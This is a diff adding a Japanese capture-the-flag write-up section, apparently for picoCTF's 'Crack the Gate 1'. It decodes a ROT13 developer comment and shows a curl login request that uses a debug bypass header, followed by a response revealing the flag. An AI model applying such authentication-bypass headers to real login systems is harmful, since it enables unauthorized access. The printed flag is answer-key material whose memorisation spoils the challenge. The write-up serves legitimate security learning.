@@ -46,3 +46,21 @@ gunzip disko-1.dd.gz
 file disko-1.dd
 strings disko-1.dd | grep -i "picoctf"
 ```
+
+## Crack the Gate 1
+### webページへアクセス
+1. デベロッパーツールから以下の文字列を発見
+```
+<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
+<!-- Remove before pushing to production! -->
+```
+2. 文字列の復号
+    1. シーザー暗号: https://dencode.com/ja/cipher
+    2. ROT13 https://dencode.com/ja/cipher/rot13
+3. ヘッダーの追加
+```bash
+# <!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" -->
+curl -X POST -H "X-Dev-Access: yes" -d 'email=ctf-player@picoctf.org&password=admin' http://amiable-citadel.picoctf.net:61058/login
+# {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_125f752d}"}
+```
+
